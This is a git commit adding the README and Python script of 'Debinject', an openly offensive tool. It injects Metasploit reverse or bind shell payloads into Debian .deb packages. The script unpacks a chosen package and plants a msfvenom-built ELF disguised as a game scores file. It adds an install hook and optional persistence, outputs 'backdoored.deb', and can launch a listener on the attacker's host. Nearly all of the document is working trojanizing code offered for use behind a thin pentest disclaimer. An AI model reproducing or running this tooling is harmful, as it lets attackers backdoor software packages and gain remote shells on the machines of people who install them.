975949838eeea2754518ee751ebaeb62f5ea6c09
Sh4d0w <sh4d0w@localhost.localdomain>
2017-07-03 22:11:34 -0400

    Upload

---
+++ README.md
@@ -0,0 +1,65 @@
+# [DEBINJECT]
+
+Copyright 2017 Debinject
+Written by: **Alisson Moretto** - [4w4k3](https://github.com/4w4k3) - [UndeadSec](https://github.com/UndeadSec)
+
+TOOL DESIGNED TO GOOD PURPOSES, PENTESTS, DON'T BE A CRIMINAL !
+
+**Only download it here, do not trust in other places.**
+
+### Cloning:
+```
+git clone https://github.com/UndeadSec/Debinject.git
+```
+
+### Running:
+```
+cd Debinject
+```
+
+```
+python debinject.py
+```
+
+If you have another version of Python:
+
+```
+python2.7 debinject.py
+```
+
+## DISCLAIMER: 
+
+"DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE."
+Taken from [LICENSE](LICENSE).
+
+### Prerequisites
+
+* dpkg
+* dpkg-deb
+* metasploit
+
+
+### Tested on:
+
++ Kali Linux - SANA
++ Kali Linux - ROLLING
+
+### Screenshot:
+![Shot](https://github.com/UndeadSec/Debinject/blob/master/Screens/sc.png)
+
+More in [Screens](Screens)
+
+### Contribute:
+Send me more features if you want it :D
+
+**I need your Help to become it to better.**
+
+## License:
+
+This project is licensed under the BSD-3-Clause - see the [LICENSE](LICENSE) file for details.
---
+++ debinject.py
@@ -0,0 +1,85 @@
+#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'
+#-------------------------------
+from os import system
+#-------------------------------
+system('clear')
+print """
+
+ --------------------{1}
+┌┬┐┌─┐┌┐ ┬┌┐┌ ┬┌─┐┌─┐┌┬┐   
+ ││├┤ ├┴┐││││ │├┤ │   │ BY: {3}ALISSON MORETTO{1} (Undead{2}Sec{1},{1} 4w4k3) {0}
+─┴┘└─┘└─┘┴┘└┘└┘└─┘└─┘ ┴ 	     {1}v.1.0
+{0} --------------------{1}
+
+""".format(GREEN, END, RED, YELLOW)
+#-------------------------------
+system('rm -Rf output')
+system("rm -Rf /tmp/evil")
+print '~ / Inject malicious codes into *.deb\'s\n '
+print "{0}[-] Insert *.deb file path: {1}".format(YELLOW, END)
+file_path = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
+print "\n{0}[-] Insert LHOST: {1}".format(YELLOW, END)
+LHOST = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
+print "\n{0}[-] Insert LPORT: {1}".format(YELLOW, END)
+LPORT = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
+#-------------------------------
+system('mkdir /tmp/evil')
+system('cp ' + file_path + ' /tmp/evil/original.deb')
+system('dpkg -x /tmp/evil/original.deb /tmp/evil/work')
+system('mkdir /tmp/evil/work/DEBIAN')
+#-------------------------------
+print '\nInsert the target arch x86 or x64: '
+arch = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
+if arch == 'x64':
+    system('cp Utils/x64/control /tmp/evil/work/DEBIAN')
+    system('cp Utils/x64/postinst /tmp/evil/work/DEBIAN')
+elif arch == 'x86':
+    system('cp Utils/x86/control /tmp/evil/work/DEBIAN')
+    system('cp Utils/x86/postinst /tmp/evil/work/DEBIAN')
+else:
+    print "\nChoose [x64] or [x86]"
+#-------------------------------
+print "\n - CHOOSE THE PAYLOAD -  "
+print "\n[1] metasploit/linux/<arch>/shell/reverse_tcp"
+print "\n[2] metasploit/linux/<arch>/meterpreter/reverse_tcp"
+print "\n[3] metasploit/linux/<arch>/meterpreter/bind_tcp"
+print "\n[4] metasploit/linux/<arch>/shell/bind_tcp"
+option = raw_input("\n{0}debinject{1} > ".format(GREEN, END))
+if option == '1':
+    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
+elif option == '2':
+    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/reverse_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
+elif option == '3':
+    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/meterpreter/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
+elif option == '4':
+    system('msfvenom -a ' + arch + ' --platform linux -p linux/' + arch + '/shell/bind_tcp LHOST=' + LHOST + ' LPORT=' + LPORT + ' -f elf -o /tmp/evil/work/usr/games/freesweep_scores')
+else:
+    print "\nInvalid"
+    system('exit')
+#-------------------------------
+persistence = raw_input('\nDo you want to enable persistence?(y/n) : ')
+if persistence.upper() == 'Y':
+    system('cp Utils/Persistence/kernellog /tmp/evil/work/usr/games/')
+
+#-------------------------------
+system('chmod 755 /tmp/evil/work/DEBIAN/postinst')
+system('cd /tmp/evil/work/DEBIAN && dpkg-deb --build /tmp/evil/work')
+system('rm -Rf output/ && mkdir output')
+system('mv /tmp/evil/work.deb output/backdoored.deb && chmod 755 output/backdoored.deb')
+#-------------------------------
+print "\n The .deb backdoored saved to: /output/backdoored.deb\n"
+listen = raw_input("Do you want to start listener? (y/n): ")
+if option != '3' and option != '4':
+    if listen.upper() == "Y":
+        if option == '1':
+            system('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/shell/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"')
+	elif option == '2':
+            system('msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/' + arch + '/meterpreter/reverse_tcp; set LHOST ' + LHOST + '; set LPORT ' + LPORT + '; run; exit -y"')
+    else:
+        print "Bye :D"
+else:
+    print "\nStart Metasploit listener and Happy Hacking"
+
+
